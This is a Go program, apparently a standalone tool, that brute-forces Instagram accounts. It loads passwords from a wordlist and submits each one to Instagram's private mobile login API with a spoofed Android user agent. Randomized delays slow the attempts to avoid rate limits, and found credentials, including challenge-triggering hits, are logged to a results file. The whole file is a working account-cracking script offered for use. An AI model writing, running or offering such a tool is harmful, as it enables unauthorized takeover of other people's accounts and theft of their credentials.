package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	API_URL    = "https://i.instagram.com/api/v1/"
	USER_AGENT = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
	TIMEOUT    = 10 * time.Second
)

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	LoggedInUser struct {
		Username string `json:"username"`
	} `json:"logged_in_user"`
}

func main() {
	// تنظیم لاگ
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
		defer logFile.Close()
	}

	fmt.Println("=== Instagram Login Tool ===")
	fmt.Printf("Time: %s\n", time.Now().UTC().Format("2006-01-02 15:04:05"))
	fmt.Printf("User: %s\n\n", "monsmain")

	var username string
	fmt.Print("Enter Instagram username: ")
	fmt.Scanln(&username)

	passwords := loadPasswords()
	if len(passwords) == 0 {
		fmt.Println("No passwords found in password.txt!")
		return
	}

	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
	fmt.Println("\nStarting login attempts...\n")

	for i, password := range passwords {
		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))
		
		success, response := tryLogin(username, password)
		
		// لاگ کردن پاسخ برای دیباگ
		log.Printf("Response for password %s: Status=%s, ErrorType=%s, Message=%s\n",
			password, response.Status, response.ErrorType, response.Message)
		
		if success {
			fmt.Printf("\n✅ SUCCESS! Login successful with password: %s\n", password)
			fmt.Printf("Username: %s\n", username)
			fmt.Printf("Login confirmed for user: %s\n", response.LoggedInUser.Username)
			saveResult(username, password, true)
			return
		} else {
			// نمایش دلیل خطا
			if response.ErrorType == "bad_password" {
				fmt.Println("❌ Invalid password")
			} else if response.ErrorType == "invalid_user" {
				fmt.Println("❌ Invalid username")
			} else if response.ErrorType == "checkpoint_required" {
				fmt.Printf("⚠️ Challenge required for password: %s\n", password)
				saveResult(username, password, true)
				return
			} else {
				fmt.Printf("⚠️ Error: %s\n", response.Message)
			}
		}

		time.Sleep(time.Duration(rand.Intn(3)+2) * time.Second)
	}

	fmt.Println("\n❌ No valid password found!")
	saveResult(username, "", false)
}

func tryLogin(username, password string) (bool, InstagramResponse) {
	loginUrl := API_URL + "accounts/login/"
	
	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))

	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return false, InstagramResponse{}
	}

	req.Header.Set("User-Agent", USER_AGENT)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-IG-Capabilities", "3brTvw==")
	req.Header.Set("X-IG-Connection-Type", "WIFI")

	client := &http.Client{Timeout: TIMEOUT}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		return false, InstagramResponse{}
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		return false, InstagramResponse{}
	}

	// لاگ کردن پاسخ خام برای دیباگ
	log.Printf("Raw response: %s\n", string(body))

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		return false, InstagramResponse{}
	}

	// بررسی دقیق‌تر وضعیت‌ها
	success := response.Status == "ok" || 
		   strings.Contains(string(body), "logged_in_user") ||
		   response.ErrorType == "checkpoint_required"

	return success, response
}

func loadPasswords() []string {
	file, err := os.Open("password.txt")
	if err != nil {
		log.Printf("Error opening password file: %v", err)
		return []string{}
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	
	for scanner.Scan() {
		pass := strings.TrimSpace(scanner.Text())
		if pass != "" {
			passwords = append(passwords, pass)
		}
	}

	return passwords
}

func saveResult(username, password string, success bool) {
	currentTime := time.Now().UTC().Format("2006-01-02 15:04:05")
	status := "Success"
	if !success {
		status = "Failed"
	}
	
	logEntry := fmt.Sprintf("[%s] %s - Username: %s, Password: %s\n", 
		currentTime, status, username, password)
	
	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	file.WriteString(logEntry)
}

func maskPassword(password string) string {
	if len(password) <= 4 {
		return "****"
	}
	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
}
